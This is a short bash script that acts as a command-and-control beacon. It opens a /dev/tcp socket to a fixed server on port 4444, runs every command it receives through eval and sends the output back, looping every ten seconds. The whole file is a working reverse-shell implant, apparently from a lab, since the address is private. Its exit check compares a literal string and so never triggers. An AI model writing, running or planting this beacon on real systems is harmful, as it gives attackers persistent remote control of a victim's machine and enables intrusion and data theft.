#!/bin/bash

# Server IP and port
SERVER_IP="192.168.108.15"
SERVER_PORT=4444

# Beacon to communicate with Agent Server
while true; do
        # Open socket
        exec 5<>/dev/tcp/$SERVER_IP/$SERVER_PORT
        while IFS= read -r command <&5; do
                echo $command
                output=$(eval "$command" 2>&1 &)
                wait
                echo "$output"
                echo "$output" >&5
        done

        command=$(cat <&5)
        echo "Command: $command"
        if [[ "command" == "exit" ]]; then
                exit
        fi

        # Execute command and send back output
        output=$(eval "$command" 2>&1)
        echo "$output" >&5

        # Close socket
        exec 5>&-; exec 5<&-

        sleep 10
done